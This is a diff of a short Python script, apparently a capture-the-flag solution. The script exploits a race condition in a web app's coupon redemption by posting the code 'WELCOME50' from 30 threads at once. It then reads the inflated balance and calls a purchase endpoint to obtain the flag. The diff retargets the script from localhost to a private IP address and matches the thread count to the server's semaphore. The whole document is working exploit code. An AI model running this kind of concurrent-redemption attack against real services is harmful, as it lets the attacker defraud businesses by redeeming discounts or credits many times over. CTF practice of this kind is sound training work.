@@ -1,29 +1,26 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
 
-URL = "http://localhost:5000"
+BASE_URL = "http://10.21.232.223:59446"
+N_WORKERS = 30  # matches server's redemption_semaphore size
 
-s = requests.Session()
+session = requests.Session()
 
-# Establish the session and get our token cookie
-s.get(URL)
+# establish a session/token
+session.get(f"{BASE_URL}/")
 
 def redeem(_):
-    r = s.post(
-        URL + "/api/redeem",
-        json={"code": "WELCOME50"}
-    )
-    return r.status_code, r.json()
+    return session.post(f"{BASE_URL}/api/redeem", json={"code": "WELCOME50"})
 
-# Send a bunch simultaneously
-with ThreadPoolExecutor(max_workers=100) as executor:
-    results = list(executor.map(redeem, range(100)))
+with ThreadPoolExecutor(max_workers=N_WORKERS) as pool:
+    results = list(pool.map(redeem, range(N_WORKERS)))
 
-for result in results:
-    print(result)
+for r in results:
+    print(r.status_code, r.json())
 
-print("Balance:", s.get(URL + "/api/balance").json())
+balance = session.get(f"{BASE_URL}/api/balance").json()["balance"]
+print("balance:", balance)
 
-# Buy the flag
-r = s.post(URL + "/api/buy_flag")
-print(r.json())
+flag_resp = session.post(f"{BASE_URL}/api/buy_ramen")
+print(flag_resp)
+print(flag_resp.status_code, flag_resp.json())
